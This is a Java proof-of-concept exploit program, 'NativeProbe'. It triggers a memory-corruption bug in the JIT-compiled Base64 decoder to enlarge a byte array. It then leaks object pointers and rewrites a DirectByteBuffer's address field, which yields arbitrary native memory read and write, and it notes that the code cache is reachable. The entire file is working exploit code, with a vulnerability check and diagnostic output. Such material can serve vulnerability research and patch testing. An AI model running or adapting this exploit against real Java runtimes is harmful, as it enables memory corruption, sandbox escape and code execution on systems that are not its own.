import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Base64;

/**
 * Probe 3: heap-only corruption -> NATIVE read/write, without Unsafe/JNI.
 *
 * The chain corrupts the `address` field of a java.nio.DirectByteBuffer by
 * writing through the corrupted writer.  The buffer's own public API then
 * dereferences an attacker-chosen 64-bit address.
 *
 * Offsets are computed, not guessed:
 *   - an Object[] holder stores the narrow oops of the victim array and of the
 *     DirectByteBuffer; both slots are visible through the writer
 *   - victim's data address = (narrow oop << 3) + 16
 *   - the victim's 0x41 fill run locates its index inside the writer view,
 *     which yields the writer's own data address
 *   - DirectByteBuffer.address is at object + 32 (Buffer's four ints follow
 *     the 16-byte header)
 */
public final class NativeProbe {
    private static volatile int sink;
    private static volatile byte[] writer;
    private static volatile byte[] victim;
    private static volatile Object[] holder;
    private static volatile ByteBuffer direct;

    public static void main(String[] args) throws Exception {
        int warmup = 1000;
        for (int i = 0; i < args.length; i++) {
            if ("--warmup".equals(args[i])) warmup = Integer.parseInt(args[++i]);
        }
        boolean jdk17 = Runtime.version().feature() <= 17;
        int n = jdk17 ? 128 : 64;
        byte[] trig = new byte[n + 1];
        Arrays.fill(trig, (byte) 'A');
        trig[n] = (byte) '=';

        System.out.println("runtime = " + System.getProperty("java.runtime.version"));

        Base64.Decoder dec = Base64.getDecoder();
        byte[] warm = new byte[256];
        for (int i = 0; i < warmup; i++) {
            try { sink += dec.decode(trig, warm); } catch (IllegalArgumentException ignored) {}
        }
        System.out.println("[warm] decoder compiled");

        // ---- allocation span: nothing allocates between these lines ----
        byte[] dst = new byte[66];
        writer = new byte[64];
        holder = new Object[2];
        direct = ByteBuffer.allocateDirect(64);
        victim = new byte[128];
        // -----------------------------------------------------------------
        holder[0] = victim;
        holder[1] = direct;

        Arrays.fill(dst, (byte) 0x5a);
        Arrays.fill(writer, (byte) 0x5a);
        Arrays.fill(victim, (byte) 0x41);
        direct.putLong(0, 0xDEADBEEFCAFEBABEL);

        try { dec.decode(trig, dst); } catch (IllegalArgumentException expected) {}
        int wl = writer.length;
        System.out.println("writer.length = " + wl + " (0x" + Integer.toHexString(wl) + ")");
        if (wl <= 64) {
            System.out.println("NOT VULNERABLE");
            System.exit(1);
        }

        // holder's data starts 16 bytes past the writer's data end (W+80).
        int victimOop = getIntLE(writer, 80);
        int directOop = getIntLE(writer, 84);
        System.out.println("victim oop = 0x" + Integer.toHexString(victimOop));
        System.out.println("direct oop = 0x" + Integer.toHexString(directOop));
        if (victimOop == 0 || directOop == 0) {
            System.out.println("LAYOUT FAILURE: holder slots are not at writer[80..88]");
            System.exit(2);
        }

        long victimAddr = ((victimOop & 0xffffffffL) << 3) + 16;
        long directObj = (directOop & 0xffffffffL) << 3;
        long directAddrField = directObj + 32;

        // Locate the victim's 0x41 run inside the writer view.
        int victimAt = -1;
        for (int i = 64; i < 2048 - 16; i++) {
            boolean hit = true;
            for (int j = 0; j < 16; j++) {
                if (writer[i + j] != (byte) 0x41) { hit = false; break; }
            }
            if (hit) { victimAt = i; break; }
        }
        if (victimAt < 0) {
            System.out.println("LAYOUT FAILURE: victim data run not found");
            System.exit(2);
        }
        long writerData = victimAddr - victimAt;
        System.out.println("victim data    = 0x" + Long.toHexString(victimAddr)
                + "  at writer[" + victimAt + "]");
        System.out.println("writer data    = 0x" + Long.toHexString(writerData));
        System.out.println("direct object  = 0x" + Long.toHexString(directObj));

        // Known pattern in the victim so the buffer read is unambiguous.
        victim[0] = (byte) 0x11;
        victim[1] = (byte) 0x22;
        victim[2] = (byte) 0x33;
        victim[3] = (byte) 0x44;
        victim[4] = (byte) 0x55;
        victim[5] = (byte) 0x66;
        victim[6] = (byte) 0x77;
        victim[7] = (byte) 0x88;
        final long expected = 0x1122334455667788L;

        // Find the address field empirically: each candidate slot is a native
        // pointer; redirect it at the victim and confirm through the buffer API.
        System.out.println();
        System.out.println("--- probing candidate address slots ---");
        int foundRel = -1;
        long realAddr = 0;
        int addrOffset = -1;
        for (int rel = 16; rel <= 64 && foundRel < 0; rel += 4) {
            long at = directObj + rel;
            int idx = (int) (at - writerData);
            if (idx < 64 || idx > 4096) continue;
            long cand = getLongLE(writer, idx);
            if (cand <= 0x7f0000000000L || cand >= 0x800000000000L) continue;

            putLongLE(writer, idx, victimAddr);
            long got;
            String err = "";
            try {
                got = direct.getLong(0);
            } catch (Throwable t) {
                err = " threw " + t.getClass().getSimpleName();
                got = 0;
            }
            putLongLE(writer, idx, cand);

            boolean ok = got == expected;
            System.out.printf("  +%-3d 0x%016x  read=0x%016x%s%s%n", rel, cand, got,
                    ok ? "   <== address field" : "", err);
            if (ok) {
                foundRel = rel;
                realAddr = cand;
                addrOffset = idx;
            }
        }

        if (foundRel < 0) {
            System.out.println("RESULT: could not locate the address field");
            System.out.println("INCONCLUSIVE");
            Runtime.getRuntime().halt(2);
        }

        System.out.println();
        System.out.println("address field at object+" + foundRel
                + " (writer[" + addrOffset + "]) = 0x" + Long.toHexString(realAddr));

        // Redirect the buffer at the victim array's data.
        putLongLE(writer, addrOffset, victimAddr);

        victim[0] = (byte) 0x11;
        victim[1] = (byte) 0x22;
        victim[2] = (byte) 0x33;
        victim[3] = (byte) 0x44;
        long nativeRead = direct.getLong(0);
        System.out.printf("%ndirect.getLong(0) = 0x%016x%n", nativeRead);

        direct.putLong(8, 0x5566778899AABBCCL);
        StringBuilder got = new StringBuilder();
        for (int i = 8; i < 16; i++) got.append(String.format("%02x ", victim[i] & 0xff));
        System.out.println("victim[8..15]     = " + got.toString().trim());

        boolean readOk = nativeRead == 0x1122334455667788L;
        boolean writeOk = (victim[8] & 0xff) == 0x55 && (victim[15] & 0xff) == 0xcc;

        putLongLE(writer, addrOffset, realAddr); // restore before GC

        System.out.println();
        System.out.println("native read  ok = " + readOk);
        System.out.println("native write ok = " + writeOk);
        if (readOk && writeOk) {
            System.out.println();
            System.out.println("NATIVE PRIMITIVE REACHED FROM HEAP CORRUPTION ALONE");
            System.out.println("DirectByteBuffer.address is a full 64-bit pointer.");
            System.out.println("The Code Cache lives in that same address space.");
            Runtime.getRuntime().halt(0);
        }
        System.out.println("INCONCLUSIVE");
        Runtime.getRuntime().halt(2);
    }

    private static int getIntLE(byte[] a, int off) {
        return (a[off] & 0xff) | ((a[off + 1] & 0xff) << 8)
                | ((a[off + 2] & 0xff) << 16) | ((a[off + 3] & 0xff) << 24);
    }

    private static void putLongLE(byte[] a, int off, long v) {
        for (int i = 0; i < 8; i++) a[off + i] = (byte) (v >>> (8 * i));
    }

    private static long getLongLE(byte[] a, int off) {
        long v = 0;
        for (int i = 7; i >= 0; i--) v = (v << 8) | (a[off + i] & 0xffL);
        return v;
    }
}
